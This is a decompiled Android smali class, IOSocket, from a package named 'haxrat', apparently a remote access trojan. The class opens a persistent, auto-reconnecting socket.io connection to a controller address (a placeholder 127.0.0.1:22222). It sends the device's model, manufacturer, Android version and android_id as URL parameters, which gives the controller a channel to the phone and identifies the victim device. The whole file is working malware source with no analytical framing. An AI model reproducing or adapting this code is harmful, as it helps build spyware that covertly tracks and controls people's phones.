.class public Lcom/hax4us/haxrat/IOSocket;
.super Ljava/lang/Object;
.source "IOSocket.java"


# static fields
.field private static ourInstance:Lcom/hax4us/haxrat/IOSocket;


# instance fields
.field private ioSocket:Lio/socket/client/Socket;


# direct methods
.method static final constructor <clinit>()V
    .locals 5

    new-instance v2, Lcom/hax4us/haxrat/IOSocket;

    move-object v4, v2

    move-object v2, v4

    move-object v3, v4

    invoke-direct {v3}, Lcom/hax4us/haxrat/IOSocket;-><init>()V

    sput-object v2, Lcom/hax4us/haxrat/IOSocket;->ourInstance:Lcom/hax4us/haxrat/IOSocket;

    return-void
.end method

.method constructor <init>()V
    .locals 15

    .prologue
    .line 15
    move-object v0, p0

    move-object v5, v0

    invoke-direct {v5}, Ljava/lang/Object;-><init>()V

    .line 18
    :try_start_0
    invoke-static {}, Lcom/hax4us/haxrat/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v5

    const-string v6, "android_id"

    invoke-static {v5, v6}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    move-object v2, v5

    .line 19
    new-instance v5, Lio/socket/client/IO$Options;

    move-object v14, v5

    move-object v5, v14

    move-object v6, v14

    invoke-direct {v6}, Lio/socket/client/IO$Options;-><init>()V

    move-object v3, v5

    .line 20
    move-object v5, v3

    const/4 v6, 0x1

    iput-boolean v6, v5, Lio/socket/client/Manager$Options;->reconnection:Z

    .line 21
    move-object v5, v3

    const/16 v6, 0x1388

    int-to-long v6, v6

    iput-wide v6, v5, Lio/socket/client/Manager$Options;->reconnectionDelay:J

    .line 22
    move-object v5, v3

    const v6, 0x3b9ac9ff

    int-to-long v6, v6

    iput-wide v6, v5, Lio/socket/client/Manager$Options;->reconnectionDelayMax:J

    .line 24
    move-object v5, v0

    new-instance v6, Ljava/lang/StringBuffer;

    move-object v14, v6

    move-object v6, v14

    move-object v7, v14

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v7, Ljava/lang/StringBuffer;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v8, Ljava/lang/StringBuffer;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    invoke-direct {v9}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v9, Ljava/lang/StringBuffer;

    move-object v14, v9

    move-object v9, v14

    move-object v10, v14

    invoke-direct {v10}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v10, Ljava/lang/StringBuffer;

    move-object v14, v10

    move-object v10, v14

    move-object v11, v14

    invoke-direct {v11}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v11, Ljava/lang/StringBuffer;

    move-object v14, v11

    move-object v11, v14

    move-object v12, v14

    invoke-direct {v12}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v12, Ljava/lang/StringBuffer;

    move-object v14, v12

    move-object v12, v14

    move-object v13, v14

    invoke-direct {v13}, Ljava/lang/StringBuffer;-><init>()V

    const-string v13, "http://127.0.0.1:22222?model="

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    sget-object v13, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-static {v13}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    const-string v12, "&manf="

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    sget-object v11, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v9

    const-string v10, "&release="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v8

    sget-object v9, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    const-string v8, "&id="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    move-object v7, v2

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lio/socket/client/IO;->socket(Ljava/lang/String;)Lio/socket/client/Socket;

    move-result-object v6

    iput-object v6, v5, Lcom/hax4us/haxrat/IOSocket;->ioSocket:Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0

    .line 26
    :goto_0
    return-void

    .line 24
    :catch_0
    move-exception v5

    move-object v2, v5

    .line 26
    move-object v5, v2

    invoke-virtual {v5}, Ljava/net/URISyntaxException;->printStackTrace()V

    goto :goto_0
.end method

.method public static getInstance()Lcom/hax4us/haxrat/IOSocket;
    .locals 3

    .prologue
    .line 32
    sget-object v2, Lcom/hax4us/haxrat/IOSocket;->ourInstance:Lcom/hax4us/haxrat/IOSocket;

    move-object v0, v2

    return-object v0
.end method


# virtual methods
.method public getIoSocket()Lio/socket/client/Socket;
    .locals 3

    .prologue
    .line 36
    move-object v0, p0

    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/IOSocket;->ioSocket:Lio/socket/client/Socket;

    move-object v0, v2

    return-object v0
.end method
